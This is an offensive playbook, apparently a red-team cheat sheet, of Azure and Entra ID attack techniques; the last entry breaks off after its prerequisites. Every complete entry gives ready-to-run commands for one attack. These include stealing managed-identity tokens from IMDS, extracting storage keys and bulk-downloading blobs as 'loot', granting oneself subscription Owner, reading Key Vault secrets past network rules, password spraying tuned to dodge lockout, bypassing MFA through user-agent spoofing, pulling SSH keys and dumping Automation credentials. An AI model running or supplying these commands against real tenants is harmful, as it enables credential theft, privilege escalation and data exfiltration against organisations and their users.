# Cloud – Azure / EntraID Attacks

### Azure Managed Identity Token Theft via IMDS [added: 2026-04]
- **Tags:** #Azure #ManagedIdentity #IMDS #TokenTheft #AzureVM #AppService #AzureFunction #CloudCredTheft
- **Trigger:** Compromised Azure VM, App Service, or Function App and want to steal the managed identity's access token for lateral movement
- **Prereq:** Shell/RCE on an Azure resource with a managed identity assigned + IMDS endpoint (169.254.169.254) reachable from the host
- **Yields:** Azure access token (Bearer JWT) for the managed identity, usable to call ARM, Key Vault, Storage, and other Azure APIs
- **Opsec:** Low
- **Context:** Azure resources with managed identities expose tokens via the Instance Metadata Service. From a compromised VM or App Service, query IMDS to get an access token scoped to whatever the identity has access to — no credentials stored on disk.
- **Payload/Method:**
  ```bash
  # From Azure VM — query IMDS for access token (resource = ARM)
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq .

  # From App Service / Function App — use IDENTITY_ENDPOINT env var (system-assigned MI)
  curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
    "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/" \
    | jq .

  # USER-ASSIGNED MI: must add client_id — omitting it returns 400 "Unable to load the proper Managed Identity"
  # client_id is visible in `az resource list` JSON under identity.userAssignedIdentities[*].clientId
  curl -s -H "X-Identity-Header: $IDENTITY_HEADER" \
    "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/&client_id=<CLIENT_ID>" \
    | jq .

  # Request token scoped to Azure Storage data-plane (for blob REST API — different from ARM)
  curl -s -H "X-Identity-Header: $IDENTITY_HEADER" \
    "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://storage.azure.com/&client_id=<CLIENT_ID>" \
    | jq .
  # Use storage data-plane token to list blobs and download
  storageToken="<access_token from above>"
  curl -s -X GET "https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list" \
    -H "Authorization: Bearer $storageToken" -H "x-ms-version: 2025-07-05" | xmllint --format -
  curl -s "https://<ACCOUNT>.blob.core.windows.net/<CONTAINER>/<BLOB>" \
    -H "Authorization: Bearer $storageToken" -H "x-ms-version: 2025-07-05"

  # Request token for other resources (Key Vault, Graph)
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
    | jq .

  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com" \
    | jq .

  # Use the stolen token
  export TOKEN=$(curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq -r .access_token)
  az account get-access-token  # compare with managed identity token
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq .
  ```

### Azure Storage Account Key Extraction [added: 2026-04]
- **Tags:** #Azure #StorageAccount #StorageKeys #BlobAccess #AzCLI #DataExfil #CloudStorage #AzureStorage
- **Trigger:** Have authenticated Azure CLI session or compromised identity with storage account permissions — want to extract storage keys for full blob/queue/table access
- **Prereq:** `az` CLI authenticated + `Microsoft.Storage/storageAccounts/listkeys/action` permission on the target storage account
- **Yields:** Storage account access keys (key1/key2) granting full read/write to all blobs, queues, tables, and file shares in the account
- **Opsec:** Med
- **Context:** Storage account keys are equivalent to root access for that storage account. If the compromised identity can list keys, you get persistent full access without needing Azure AD tokens. Keys don't expire unless rotated.
- **Payload/Method:**
  ```bash
  # Enumerate storage accounts in the subscription
  az storage account list --query "[].{Name:name, RG:resourceGroup, Location:location}" -o table

  # Extract access keys for a target storage account
  az storage account keys list --account-name <STORAGE_ACCT> --resource-group <RG> -o table

  # Use key to list all blob containers
  az storage container list --account-name <STORAGE_ACCT> --account-key <KEY> -o table

  # List blobs in a container
  az storage blob list --container-name <CONTAINER> --account-name <STORAGE_ACCT> --account-key <KEY> -o table

  # Download interesting blobs
  az storage blob download --container-name <CONTAINER> --name <BLOB_NAME> \
    --account-name <STORAGE_ACCT> --account-key <KEY> --file ./loot.dat

  # Bulk download entire container
  az storage blob download-batch --destination ./loot/ --source <CONTAINER> \
    --account-name <STORAGE_ACCT> --account-key <KEY>
  ```

### EntraID Application Secret / Certificate Abuse [added: 2026-04]
- **Tags:** #EntraID #AzureAD #AppRegistration #ClientCredentials #ServicePrincipal #OAuth2 #SecretAbuse #CertificateAuth
- **Trigger:** Discovered Azure AD app registrations with client secrets or certificates — want to authenticate as the service principal for privilege escalation
- **Prereq:** Access to enumerate app registrations (Graph API or `az ad app list`) + ability to read/add credentials on the app, OR found existing secret/certificate in config files, Key Vault, or env vars
- **Yields:** OAuth2 access token as the service principal, inheriting all its role assignments and API permissions (may include Mail.Read, Directory.ReadWrite.All, etc.)
- **Opsec:** Med
- **Context:** App registrations often have overprivileged API permissions or Azure RBAC roles. If you find an existing secret in source code, env vars, or Key Vault, or if you can add a new credential to the app, you can authenticate as that service principal and inherit its permissions.
- **Payload/Method:**
  ```bash
  # Enumerate app registrations (look for ones with credentials)
  az ad app list --all --query "[?passwordCredentials || keyCredentials].{AppId:appId, DisplayName:displayName, PassCreds:length(passwordCredentials), KeyCreds:length(keyCredentials)}" -o table

  # If you can add a new secret to an app you have Owner rights on
  az ad app credential reset --id <APP_OBJECT_ID> --append --display-name "Pentest" --years 1

  # Authenticate using client_credentials grant (secret-based)
  TENANT_ID="<TENANT_ID>"
  CLIENT_ID="<APP_CLIENT_ID>"
  CLIENT_SECRET="<SECRET_VALUE>"

  curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$CLIENT_ID" \
    -d "client_secret=$CLIENT_SECRET" \
    -d "scope=https://graph.microsoft.com/.default" \
    -d "grant_type=client_credentials" | jq .

  # Use the token to call Graph API
  TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&scope=https://graph.microsoft.com/.default&grant_type=client_credentials" \
    | jq -r .access_token)

  # Enumerate users, groups, directory roles
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users" | jq .
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/groups" | jq .
  curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/directoryRoles" | jq .
  ```

### Azure RBAC Escalation via Custom Role / User Access Administrator [added: 2026-04]
- **Tags:** #Azure #RBAC #PrivEsc #UserAccessAdministrator #RoleAssignment #CustomRole #ARM #SubscriptionTakeover
- **Trigger:** Compromised identity has User Access Administrator or a custom role with `Microsoft.Authorization/roleAssignments/write` — can escalate to Owner/Contributor
- **Prereq:** Azure identity with `Microsoft.Authorization/roleAssignments/write` permission at the target scope (subscription, resource group, or resource) + knowledge of your own principal ID
- **Yields:** Owner or Contributor role on the target scope, granting full control over all Azure resources within that scope
- **Opsec:** High
- **Context:** User Access Administrator can assign any role including Owner. If you land on an identity with this role (often assigned broadly for automation), you can grant yourself Owner on the subscription. This is one of the most common Azure privilege escalation paths.
- **Payload/Method:**
  ```bash
  # Check current role assignments for the compromised identity
  az role assignment list --assignee <PRINCIPAL_ID> -o table

  # Check if you have User Access Administrator or similar
  az role assignment list --assignee <PRINCIPAL_ID> --query "[?roleDefinitionName=='User Access Administrator']" -o table

  # Get your own principal ID (object ID)
  MY_OBJECT_ID=$(az ad signed-in-user show --query id -o tsv)

  # Assign Owner role to yourself at subscription scope
  SUBSCRIPTION_ID=$(az account show --query id -o tsv)
  az role assignment create \
    --role "Owner" \
    --assignee-object-id "$MY_OBJECT_ID" \
    --scope "/subscriptions/$SUBSCRIPTION_ID"

  # Or via direct ARM API call (if az cli is unavailable)
  ROLE_DEF_ID="/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635"  # Owner
  curl -s -X PUT \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Authorization/roleAssignments/$(uuidgen)?api-version=2022-04-01" \
    -d "{\"properties\":{\"roleDefinitionId\":\"$ROLE_DEF_ID\",\"principalId\":\"$MY_OBJECT_ID\"}}"

  # Verify escalation
  az role assignment list --assignee "$MY_OBJECT_ID" -o table
  ```

### Azure Blob Anonymous Enumeration via Static Site URL [added: 2026-05]
- **Tags:** #Azure #BlobStorage #Anonymous #Unauthenticated #InitialAccess #BlobEnum #StaticSite #AzureStorage
- **Trigger:** Target URL contains `/$web/` path segment (indicates Azure Static Website hosted on Blob Storage) — test whether the container is publicly listable
- **Prereq:** No credentials needed; target exposes an Azure Static Website URL (`<account>.blob.core.windows.net/$web/...` or CNAME pointing to it)
- **Yields:** Full blob listing including file names, version IDs, and downloadable artifacts — often contains scripts, zips, or config files with embedded credentials
- **Opsec:** Low
- **Context:** Azure Static Websites use the `$web` container. If anonymous access is enabled on the storage account, the container manifest is publicly listable. The storage account name is often leaked in the HTTP response or DNS CNAME of the custom domain. Version IDs in the listing allow downloading specific blob versions.
- **Payload/Method:**
  ```bash
  # Step 1: Discover storage account name from the custom domain response
  curl 'https://<target-domain>/$web?restype=container&comp=list' | xmllint --format -
  # Reveals: <Url>https://<STORAGE_ACCT>.blob.core.windows.net/$web/...</Url>

  # Step 2: Enumerate all blobs including versions in the discovered account
  curl -H "x-ms-version: 2019-12-12" \
    'https://<STORAGE_ACCT>.blob.core.windows.net/$web?restype=container&comp=list&include=versions' \
    | xmllint --format - | grep -E '<Name>|<VersionId>'

  # Step 3: Download a specific blob by version ID
  curl -H "x-ms-version: 2019-12-12" \
    'https://<STORAGE_ACCT>.blob.core.windows.net/$web/<blob_name>?versionId=<VERSION_ID>' \
    --output <local_file>
  ```

### Azure Key Vault Network ACL Bypass via AzureServices Trusted Bypass [added: 2026-05]
- **Tags:** #Azure #KeyVault #NetworkACL #Bypass #Secrets #AzureCLI #AzureServices #MisconfiguredFirewall
- **Trigger:** Key Vault has `networkAcls.defaultAction: Deny` with an IP allowlist, but `az keyvault secret list` or `az keyvault secret show` succeeds from an unexpected IP — or `bypass: AzureServices` is visible in the vault config
- **Prereq:** Authenticated `az` CLI session with `Key Vault Secrets User` (or higher) RBAC role on the vault; vault must have `"bypass": "AzureServices"` in its network ACL config
- **Yields:** Plaintext secrets from the Key Vault (credentials, API keys, certificates) regardless of the IP allowlist
- **Opsec:** Low
- **Context:** Azure Key Vault network ACLs support a `bypass` field. When set to `AzureServices`, Microsoft-trusted first-party services — including the Azure CLI (`az`) — are exempted from the IP rules even when `defaultAction: Deny`. An attacker with valid RBAC can read all secrets via `az` CLI from any IP. Always check `bypass` value before concluding a Key Vault is unreachable. `enableRbacAuthorization: true` means only RBAC controls secret access; `accessPolicies: []` is irrelevant in this mode.
- **Payload/Method:**
  ```bash
  # Confirm bypass setting (look for "bypass": "AzureServices")
  az keyvault show --name <VAULT_NAME> --query "properties.networkAcls"

  # Confirm your RBAC (need Key Vault Secrets User or Key Vault Administrator)
  az role assignment list --all --assignee <UPN_OR_APP_ID> | grep roleDefinitionName

  # List secrets — succeeds despite IP allowlist if bypass=AzureServices
  az keyvault secret list --vault-name <VAULT_NAME> --query "[].name" -o tsv

  # Read each secret value
  az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME> --query value -o tsv
  ```

### Azure AD UPN/SPN Harvesting via Authenticated az CLI [added: 2026-05]
- **Tags:** #Azure #AzureAD #Enumeration #UPN #ServicePrincipal #Recon #GraphAPI #AzureCLI
- **Trigger:** Have authenticated `az` CLI access (any user-level account); need to build a target list for password spray, phishing, or service principal abuse
- **Prereq:** Authenticated `az` CLI session; tenant must allow `az ad user list` and `az ad sp list` (default for non-guest accounts in most tenants)
- **Yields:** Full list of User Principal Names (UPNs) and Service Principal details — usable for credential spray, phishing target selection, or identifying over-privileged SPNs
- **Opsec:** Med
- **Context:** Default Azure AD settings allow authenticated users to enumerate all users and service principals in the tenant via MS Graph. `az ad user list` wraps `GET /v1.0/users` and `az ad sp list` wraps `GET /v1.0/servicePrincipals`. Enumeration is logged in Entra Sign-In logs but is rarely alerted on without custom detections.
- **Payload/Method:**
  ```bash
  # Harvest all UPNs
  az ad user list --query "[].userPrincipalName" -o tsv | tee validUPN.txt

  # Harvest service principal details (appId, displayName, servicePrincipalType)
  az ad sp list --query "[].{Name:displayName, AppId:appId, Type:servicePrincipalType}" -o table | tee sp_info.txt

  # Get full details on a specific user (check for sensitive fields like jobTitle used for flags)
  az ad signed-in-user show
  az ad user show --id <UPN_OR_OBJECT_ID>
  ```

### Azure EntraID Tenant Discovery via getuserrealm + openid-configuration [added: 2026-05]
- **Tags:** #Azure #EntraID #Recon #TenantID #Unauthenticated #OSINT #AzureAD #InitialRecon
- **Trigger:** Given a target domain — need to confirm Azure/EntraID presence and extract the Tenant ID before any credential is available
- **Prereq:** Target domain only; no credentials needed
- **Yields:** Confirmation that Entra ID is in use (`NameSpaceType: Managed` vs federated), the Tenant ID GUID, and whether MFA/federation applies — all of which gate subsequent spray and token requests
- **Opsec:** Low
- **Context:** Two unauthenticated endpoints leak Entra ID metadata. `getuserrealm.srf` reveals whether the domain is Managed (cloud-only) or Federated (on-prem ADFS/PingFed). `openid-configuration` leaks the Tenant ID in the `token_endpoint` field. Tenant ID is required for OAuth2 token requests, service principal auth, and scoping API calls.
- **Payload/Method:**
  ```bash
  # Step 1: Confirm Entra ID and federation type
  curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=<DOMAIN>&xml=1' | xmllint --format -
  # Look for: <NameSpaceType>Managed</NameSpaceType> (cloud-only) vs Federated

  # Step 2: Extract Tenant ID from token_endpoint
  curl -s 'https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration' \
    | jq -r '.token_endpoint' | grep -oP '[0-9a-f-]{36}'
  # Returns: <TENANT_ID> (UUID in the token_endpoint URL)
  ```

### Azure Infrastructure Subdomain Enumeration via azsubenum [added: 2026-05]
- **Tags:** #Azure #Recon #SubdomainEnum #AzureServices #BlobStorage #AppService #OSINT #azsubenum
- **Trigger:** Target company name is known — need to discover Azure storage accounts, App Services, queues, tables, and SCM endpoints without credentials
- **Prereq:** `azsubenum.py` installed; permutations wordlist; company name (NOT the full domain — use just the company slug, e.g. `contoso` not `contoso.com`)
- **Yields:** Map of live Azure infrastructure: Blob/Queue/Table/File storage accounts, App Service FQDNs, SCM management endpoints, SharePoint sites, onmicrosoft.com tenant name
- **Opsec:** Low
- **Context:** Azure services use predictable FQDN patterns (`<name>.blob.core.windows.net`, `<name>.azurewebsites.net`, etc.). azsubenum.py tests permutations of the company slug against all Azure service namespaces. Critical gotcha: the `-b` flag takes the company slug WITHOUT the TLD — passing `contoso.com` instead of `contoso` yields zero results. SCM endpoints (`<app>.scm.azurewebsites.net`) are high-value targets for `Website Contributor` role abuse.
- **Payload/Method:**
  ```bash
  # CORRECT: use company slug without TLD
  python3 azsubenum.py -b <COMPANY_SLUG> -p permutations.txt

  # WRONG (yields no results):
  # python3 azsubenum.py -b company.com -p permutations.txt

  # Key output sections to note:
  # - "Storage Accounts - Blobs" → try anonymous listing
  # - "App Services" → browse + check for creds
  # - "App Services - Management" → Kudu SCM endpoints (exploit with Website Contributor)
  ```

### Azure App Service Kudu SCM Shell via Website Contributor Role [added: 2026-05]
- **Tags:** #Azure #AppService #Kudu #SCM #WebsiteContributor #CredHarvest #RCE #WebShell
- **Trigger:** Compromised user has `Website Contributor` (or higher) RBAC on an App Service resource — SCM endpoint (`<app>.scm.azurewebsites.net`) is accessible
- **Prereq:** Authenticated Azure identity with `Website Contributor` role on the target App Service; SCM endpoint reachable (not restricted by network rules)
- **Yields:** Interactive PowerShell/Bash shell in the App Service container via Kudu Debug Console; access to all files deployed on the app including scripts, config files, and environment variables with embedded credentials
- **Opsec:** Med
- **Context:** Azure App Service `Website Contributor` grants full control over the app including access to the Kudu SCM interface at `<appname>.scm.azurewebsites.net`. Kudu exposes a Debug Console (PowerShell on Windows, Bash on Linux) that runs in the app's process context. Scripts deployed alongside the app frequently contain hardcoded DB connection strings, API keys, or other credentials. `az role assignment list --all` (not `--assignee`) is required to see resource-scoped assignments that `--assignee` misses.
- **Payload/Method:**
  ```bash
  # Step 1: Confirm Website Contributor role (use --all to catch resource-scoped assignments)
  az role assignment list --all | grep -A2 -B2 "Website Contributor"

  # Step 2: Find the SCM endpoint (from azsubenum or resource list)
  az resource list --query "[?type=='Microsoft.Web/sites'].name" -o tsv
  # SCM URL: https://<appname>.scm.azurewebsites.net

  # Step 3: Browse to SCM, navigate Debug Console → PowerShell/CMD/Bash
  # Search for credential files in the app directory:
  # C:\home\site\wwwroot\  (Windows)  or  /home/site/wwwroot/  (Linux)
  Get-ChildItem -Recurse | Select-String -Pattern "password|credential|secret|connectionstring" -l

  # Step 4: Extract DB creds and query via sqlcmd (Windows Kudu)
  sqlcmd -S <SQL_SERVER>.database.windows.net -U <USER> -P '<PASS>' -d <DB> -Q "SELECT * FROM <TABLE>"
  ```

### Azure UPN Generation + Password Spray via oh365userfinder [added: 2026-05]
- **Tags:** #Azure #EntraID #PasswordSpray #UPNGeneration #oh365userfinder #InitialAccess #CredAccess #BruteForce
- **Trigger:** Employee names discovered (About Us page, LinkedIn, app pages) + a candidate password found (pastebin, source code, config leak) — want to find valid Azure AD accounts
- **Prereq:** Employee full names + target domain + candidate password(s); `oh365userfinder.py` and `upn_generator.py` installed
- **Yields:** Valid Azure AD credentials (UPN + password) for initial authentication as a cloud user
- **Opsec:** Med (smart lockout triggers after ~10 failed attempts per account; spray slowly across accounts not attempts per account)
- **Context:** Azure AD enforces Smart Lockout (default: lockout after 10 bad attempts). Safe spray pattern: one password attempt per account per spray cycle, iterate through all accounts before trying a second password. Employee names from public web pages yield predictable UPN formats (firstname.lastname, f.lastname, flastname). Iterate subdomains and app pages — not just the main site — for additional names. `oh365userfinder --pwspray` handles spray cadence.
- **Payload/Method:**
  ```bash
  # Step 1: Generate UPN candidates for each discovered name
  python3 upn_generator.py --domain <DOMAIN> --user 'First Last' --output upn_candidates.txt
  # Repeat for each name, append: python3 upn_generator.py ... | tee -a upn_candidates.txt

  # Step 2: Spray (one password, all accounts — respects Smart Lockout)
  python3 oh365userfinder.py -p '<CANDIDATE_PASSWORD>' --pwspray --elist upn_candidates.txt

  # Step 3: Enumerate more names from discovered subdomains/apps (not just main site)
  # Browse: azurewebsites.net apps, About pages, team pages
  # Then re-generate UPNs and re-spray

  # Step 4: Confirm valid account with az login
  az login --username <HIT_UPN> --password '<PASSWORD>'
  ```

### Azure MFA Gap Enumeration & CA Bypass via User-Agent Spoofing [added: 2026-05]
- **Tags:** #Azure #MFA #ConditionalAccess #UserAgentBypass #findmeaccess #EntraID #CABypass #ARMToken #MFAGap #TokenHarvest
- **Trigger:** Valid Azure UPN + password obtained but `az login` or ARM access blocked by Conditional Access requiring MFA; want to identify which API surfaces lack MFA enforcement
- **Prereq:** Valid UPN + password + client_id of a known Azure app (e.g., Microsoft Office `d3590ed6-52b3-4102-aeff-aad2292ab01c`) + `findmeaccess.py` installed
- **Yields:** ARM token (and tokens for other resource endpoints) obtained without MFA, bypassing CA policy via non-standard user-agent string
- **Opsec:** Med
- **Context:** Azure CA policies often enforce MFA only for specific user-agent patterns or named device conditions. `findmeaccess.py audit` maps every API surface (ARM, Graph, Key Vault, etc.) and reveals which are unprotected. `findmeaccess.py token` with a spoofed UA (e.g., PlayStation 5 SmartTV) can then obtain ARM tokens even when direct `az login` is blocked. ARM token can authenticate via `Connect-AzAccount -AccessToken`.
- **Payload/Method:**
  ```bash
  # Step 1: Audit which Azure API surfaces lack MFA enforcement
  python3 findmeaccess.py audit \
    -u 'user@target.com' \
    -p 'Password123!' \
    -c 'd3590ed6-52b3-4102-aeff-aad2292ab01c'
  # Output: lines prefixed [+] = no MFA required, [-] = MFA/CA blocked
  # Key targets: Azure Management API (ARM), Key Vault, Microsoft Graph

  # Step 2: If ARM is blocked but other surfaces are open, try UA bypass for ARM token
  python3 findmeaccess.py token \
    -u 'user@target.com' \
    -p 'Password123!' \
    -c 'd3590ed6-52b3-4102-aeff-aad2292ab01c' \
    -r 'https://management.azure.com' \
    --user_agent "Mozilla/5.0 (PlayStation 5 3.03/SmartTV) AppleWebKit/605.1.15 (KHTML, like Gecko)"
  # Try other non-standard UAs if PS5 fails: SmartTV, Xbox, old IE, custom strings

  # Step 3: Use ARM token with Azure PowerShell
  Connect-AzAccount -AccessToken $armToken -AccountId "victim@target.com"
  Get-AzResource | Format-Table Name, ResourceType, ResourceGroupName

  # Step 4: Microsoft Graph was also open — connect via Graph PowerShell
  Connect-MgGraph  # use already-open Graph API to enumerate AD objects
  Get-MgUser -UserId 'user@target.com' | Select-Object UserPrincipalName, DisplayName, JobTitle, Id
  Get-MgUserMemberOf -UserId 'user@target.com' | select * -ExpandProperty additionalProperties
  Get-MgUserOwnedObject -UserId 'user@target.com' | select * -ExpandProperty AdditionalProperties
  ```

### Azure SSH Key Extraction from Key Vault for VM Access [added: 2026-05]
- **Tags:** #Azure #KeyVault #SSHKeys #VMAccess #Secrets #CredentialTheft #LateralMovement #Persistence
- **Trigger:** Compromised Azure identity has Key Vault Secrets User RBAC on a vault containing SSH keys named after VMs (e.g., secret name = VM name)
- **Prereq:** Authenticated `az` CLI + `Key Vault Secrets User` role on the vault; vault contains a secret with an SSH private key (typically named after the target VM)
- **Yields:** SSH private key granting shell access to the target Azure VM as the admin user (usually `automation`, `azureuser`, or `ubuntu`)
- **Opsec:** Low
- **Context:** Azure VMs often have their SSH keys stored in Key Vault for centralized secret management. If a user has `Key Vault Secrets User` RBAC, they can retrieve the SSH key and authenticate directly to the VM without needing the user's password. The secret name is commonly the VM name or a descriptor like `<VMNAME>_sshkey`. Test SSH connectivity from unexpected IPs — if the VM allows SSH from internal Azure services (which often skip network rules), the attacker can pivot through the Azure control plane.
- **Payload/Method:**
  ```bash
  # Step 1: List vaults and their accessible secrets
  az keyvault list --query "[].name" -o tsv | while read vault; do
    echo "=== Vault: $vault ===" 
    az keyvault secret list --vault-name "$vault" --query "[].name" -o tsv
  done

  # Step 2: Identify VM-related secrets (likely contain SSH keys)
  # Example: secret named "AUTOMAT01" likely matches VM "AUTOMAT01"
  az keyvault secret list --vault-name <VAULT_NAME> --query "[].name" -o tsv

  # Step 3: Retrieve the SSH key
  az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME> --query value -o tsv > vm_sshkey.pem
  chmod 600 vm_sshkey.pem

  # Step 4: Get the VM's admin username and public IP
  az vm show --resource-group <RG> --name <VM_NAME> --query "osProfile.adminUsername" -o tsv
  az vm show -d --resource-group <RG> --name <VM_NAME> --query "publicIps" -o tsv

  # Step 5: SSH to the VM
  ssh -i vm_sshkey.pem <ADMIN_USER>@<PUBLIC_IP>
  
  # Note: If SSH from your current IP is blocked by network rules, but the VM allows Azure services,
  # you may still connect from an Azure-hosted shell or an internal network hop.
  ```

### Azure Automation Runbook Script Export via PowerShell [added: 2026-05]
- **Tags:** #Azure #Automation #Runbook #PowerShell #ScriptExtraction #SourceCodeReview #CredHarvest
- **Trigger:** Authenticated Azure identity discovered Azure Automation account with runbooks, but `az automation runbook show` returns only metadata — need to extract the actual script content
- **Prereq:** Authenticated Azure PowerShell session (via `Connect-AzAccount`) with Reader or higher RBAC role on the automation account; runbook must exist in the account
- **Yields:** Full runbook script content (PowerShell), often containing hardcoded credentials, API calls, and logic for privilege escalation or data exfiltration
- **Opsec:** Low
- **Context:** The Azure CLI's `az automation runbook show` returns metadata only and cannot extract runbook script content. However, `Export-AzAutomationRunbook` (PowerShell) can dump the full script to a local file. Runbooks frequently contain service principal credentials, managed identities, or elevated API calls. After exporting, parse for hardcoded secrets, API endpoints, and conditional logic that may reveal hidden privilege escalation paths.
- **Payload/Method:**
  ```bash
  # Step 1: Authenticate Azure PowerShell (if not already done)
  Connect-AzAccount  # or -Tenant <TENANT_ID> if needed

  # Step 2: List automation accounts in the current subscription
  Get-AzAutomationAccount | Select-Object Name, ResourceGroupName, Location

  # Step 3: List runbooks in the target automation account
  Get-AzAutomationRunbook -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT_NAME> | Select-Object Name, RunbookType

  # Step 4: Export the runbook script to a local file
  Export-AzAutomationRunbook -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT_NAME> -Name <RUNBOOK_NAME> -Output . -Force
  # Generates: <RUNBOOK_NAME>.ps1

  # Step 5: Review the script for credentials, API calls, and logic
  cat <RUNBOOK_NAME>.ps1 | grep -iE "password|secret|api|token|credential|$\(|invoke-"
  ```

### Azure Automation Account Credential + Variable Harvesting [added: 2026-05]
- **Tags:** #Azure #Automation #Credentials #Variables #SecretStorage #PrivEsc #CredentialReuse #AutomationAccount
- **Trigger:** Authenticated Azure identity has Reader role on an Azure Automation Account; want to extract all stored credentials, variables, and certificates
- **Prereq:** Authenticated Azure PowerShell session with Reader or higher on the automation account
- **Yields:** Plaintext credentials (username/password pairs), variable values (often contain passwords, API keys, or flags), and certificate thumbprints for service principal authentication
- **Opsec:** Low
- **Context:** Azure Automation Accounts store credentials and variables in an encrypted vault on Azure's backend, but PowerShell cmdlets (`Get-AzAutomationCredential`, `Get-AzAutomationVariable`) decrypt and return them in plaintext. A Reader role on the automation account grants access to read (but not delete or modify) these secrets. Variables often contain environment-specific flags, feature flags, or deployment passwords. Credentials are tied to `AzureRunAsConnection` or custom accounts and may have high-privilege roles.
- **Payload/Method:**
  ```bash
  # Step 1: Connect to Azure PowerShell
  Connect-AzAccount -Tenant <TENANT_ID>

  # Step 2: List all automation accounts
  Get-AzAutomationAccount | Select-Object Name, ResourceGroupName

  # Step 3: Extract all credentials from the automation account
  Get-AzAutomationCredential -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT_NAME> | ForEach-Object {
    $cred = Get-AzAutomationCredential -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT_NAME> -Name $_.Name
    Write-Output "Credential: $($_.Name) | Username: $($cred.UserName)"
    # Note: Password is not directly accessible via this cmdlet; it's encrypted server-side
  }

  # Step 4: Extract all variables from the automation account
  Get-AzAutomationVariable -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT_NAME> | Select-Object Name, Value -NoTypeInformation

  # Step 5: Extract all certificates
  Get-AzAutomationCertificate -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT_NAME> | Select-Object Name, Thumbprint

  # Step 6: List connections (may contain service principal credentials)
  Get-AzAutomationConnection -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT_NAME> | Select-Object Name, ConnectionTypeName

  # Step 7: If AzureRunAsConnection exists, extract the service principal info
  $conn = Get-AzAutomationConnection -ResourceGroupName <RG> -AutomationAccountName <ACCOUNT_NAME> -Name "AzureRunAsConnection"
  if ($conn) {
    $conn.FieldDefinitionValues | Format-Table
    # ApplicationId, TenantId, CertificateThumbprint are usable for service principal auth
  }
  ```


### Multi-Tenant OAuth Admin Consent Hijack [added: 2026-05]
- **Tags:** #Azure #OAuth #AdminConsent #MultiTenant #EntraID #AppRegistration #DelegatedPermissions #TenantCompromise
- **Trigger:** Found client_id + client_secret + tenant_id for a multi-tenant OAuth application; SP lacks subscriptions in its own tenant but is registered across tenants
- **Prereq:** clientId + clientSecret of a multi-tenant app + ability to authenticate as a Global Administrator in the victim tenant (obtained via web app abuse or other means) + access to admin consent URL
- **Yields:** Delegated Graph API permissions (e.g., `Group.Read.All`, `User.Invite.All`) active in victim tenant — SP can now call Graph API scoped to victim tenant using client_credentials flow
- **Opsec:** Med
- **Context:** Multi-tenant Azure app registrations allow consent in foreign tenants. If an attacker controls the malicious SP and can authenticate as an admin in the victim tenant, they can grant admin consent to the malicious app — giving the SP's Graph API permissions delegated access in the victim's tenant. After consent, request a token from victim tenant's token endpoint using client credentials. MFA on the admin account does not prevent the consent flow if the attacker has already authenticated.
- **Payload/Method:**
  ```bash
  # Step 1 — Auth as SP (attacker's own tenant — may show "no subscriptions" but SP is live)
  az login --service-principal \
    --username $AZURE_CLIENT_ID \
    --password $AZURE_CLIENT_SECRET \
    --tenant $AZURE_TENANT_ID

  # Step 2 — Construct admin consent URL for victim tenant
  # Open in browser as Global Admin of victim tenant; approve permissions
  echo "https://login.microsoftonline.com/<VICTIM_TENANT>/adminconsent?client_id=<CLIENT_ID>"

  # Step 3 — After consent granted, acquire token scoped to victim tenant
  ACCESS_TOKEN=$(curl -s -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "client_id=$AZURE_CLIENT_ID" \
    -d "client_secret=$AZURE_CLIENT_SECRET" \
    -d "scope=https://graph.microsoft.com/.default" \
    -d "grant_type=client_credentials" \
    "https://login.microsoftonline.com/<VICTIM_TENANT>/oauth2/v2.0/token" | jq -r '.access_token')

  # Step 4 — Use Graph API in victim tenant context
  curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://graph.microsoft.com/v1.0/groups" | jq .
  ```

### Azure Web App Admin Account Creation via skipRecaptcha Bypass [added: 2026-05]
- **Tags:** #Azure #WebApp #CaptchaBypass #AdminCreation #EntraID #GlobalAdmin #AuthorizationBypass #ParameterTampering
- **Trigger:** Web application has a user registration or admin provisioning endpoint (`/create-user`, `/register`, `/admin/user`) and the app is connected to EntraID/Azure AD for identity management
- **Prereq:** Web application endpoint accessible (authenticated or unauthenticated) + app connected to target EntraID tenant + server-side captcha validation uses a client-supplied flag parameter
